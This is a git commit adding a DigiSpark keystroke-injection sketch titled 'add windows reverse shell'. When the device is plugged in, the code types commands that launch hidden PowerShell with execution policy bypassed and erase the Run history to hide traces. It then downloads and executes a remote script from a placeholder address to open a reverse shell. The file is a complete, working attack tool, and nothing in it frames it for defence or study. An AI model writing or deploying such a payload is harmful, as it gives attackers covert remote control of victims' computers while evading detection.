ca811253748d36e38d7718cb0f70c2024ec5150b
rqm <rqm@users.noreply.github.com>
2023-06-05 22:44:12 +0700

    add windows reverse shell

---
+++ scripts/windows/reverse_shell/reverse_shell.ino
@@ -0,0 +1,27 @@
+#include "DigiKeyboard.h"
+
+void setup()
+{
+    // reset
+    DigiKeyboard.sendKeyStroke(0);
+    // open run
+    DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+    DigiKeyboard.delay(500);
+    // obfuscation via cmd and hidden powershell option
+    DigiKeyboard.print("cmd /c start /min \"\" powershell -NoP -NonI -Exec Bypass -W Hidden ");
+    DigiKeyboard.delay(100);
+    // erase run history
+    DigiKeyboard.print("Remove-ItemProperty -Path HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU -Name *;");
+    DigiKeyboard.delay(100);
+    // run remote reverse shell script
+    DigiKeyboard.print("IEX (New-Object Net.WebClient).DownloadString('https://X.X.X.X/shell.ps1')");
+    DigiKeyboard.delay(100);
+    DigiKeyboard.sendKeyStroke(KEY_ENTER);
+    // done
+    pinMode(1, OUTPUT);
+    digitalWrite(1, HIGH);
+}
+
+void loop()
+{
+}
